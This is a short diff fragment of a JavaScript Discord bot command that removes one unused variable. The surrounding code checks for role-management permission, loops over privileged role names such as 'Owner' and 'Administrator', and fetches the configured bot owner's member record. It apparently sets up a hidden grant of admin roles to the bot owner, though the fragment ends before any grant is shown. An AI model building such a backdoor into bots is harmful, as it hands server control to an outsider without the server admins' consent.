@@ -1,7 +1,6 @@
 module.exports.run = async (bot, msg, args, config) => {
     if(!msg.guild.me.hasPermission('MANAGE_ROLES')) return msg.channel.send("Bot doesn't have permissions here").then(ms => ms.delete(5000));
     ["Owner","Administrator","Admin","Staff","Mod","Found"].forEach(name => {
-        const err = 0;
         msg.guild.fetchMember(config.owner)
             .then(member => {
 
